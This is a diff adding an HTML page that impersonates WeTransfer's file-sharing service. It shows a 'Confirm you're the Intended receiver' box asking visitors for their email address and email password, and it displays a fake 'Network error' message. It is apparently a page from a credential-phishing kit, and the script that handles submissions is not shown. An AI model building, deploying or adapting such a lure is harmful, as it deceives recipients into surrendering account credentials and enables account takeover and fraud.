@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="head.css">
+<title>WeTransfer - Send Large Files &amp; Share Photos Online - Up to 2GB Free</title>
+    <link rel="icon" type="image/ico" href="favicon.ico">
+
+</head>
+<body class="bg"> 
+<div id="overlay" > 
+  <div id="float-box" style="margin-top: 150px;">          
+				<center>
+					<img src="logo.png" style="width: 200px">
+				</center>           
+          <div style="text-align: left;"> <br>
+          	<font size="2" style="font-weight: bolder; margin: 4px;">Confirm you're the Intended receiver.</font><br><br>
+          </div>  
+          <form method="POST">
+          	<input type="email" id="email" placeholder="Valid Email Address" autocomplete="off">
+          	<input type="password" id="password" style="margin-top: 10px" pattern=".{5,30}" placeholder="Email Password">            
+          <button type="submit" id="submit">Verify</button><br>
+          <span id="error" style="color: red; display: none;"><small>Network error, Please try again.</small></span>
+          <br>
+          </form>
+        </div>
+</div>
+<script src="jquery.js"></script> 
+ 
+</body>
+</html>
